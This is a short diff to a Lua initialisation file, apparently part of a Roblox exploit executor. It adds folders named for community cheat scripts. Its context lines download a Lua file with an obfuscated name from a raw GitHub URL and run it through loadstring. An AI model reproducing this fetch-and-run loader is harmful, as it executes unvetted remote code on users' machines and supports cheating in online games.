@@ -41,6 +41,7 @@ Engine.Init = function(Identity)
     
     if Identity then
         if Identity == "KrnlNew" then
+	    Engine.AssertFolders({"ExecutorConfigs/Community","ExecutorConfigs/Community/Infinite Yield","ExecutorConfigs/Community/Dex V4","ExecutorConfigs/Community/CMD X"})
             LoadModule("ExecutorConfigs/bin/rSQzWfGnFhL7VJvaamB5E5GhcDmb4WvyXAUPMFK4aMNM4D5UjGNjx6qUf46T","https://raw.githubusercontent.com/aA910FLsaIASFO1/gits/refs/heads/main/q90UP5N0CggF46LAUBW6ca3S3ACC4Ghqb5wpNNuHAQxrhFSHfXNcxmdcKMUue1jmSZfXKcAkRVHCckV6iRPzkTUWW0fjUjAeL0Lb.lua")
             local e  = loadstring(readfile("ExecutorConfigs/bin/rSQzWfGnFhL7VJvaamB5E5GhcDmb4WvyXAUPMFK4aMNM4D5UjGNjx6qUf46T"))()
     	    e.Init()
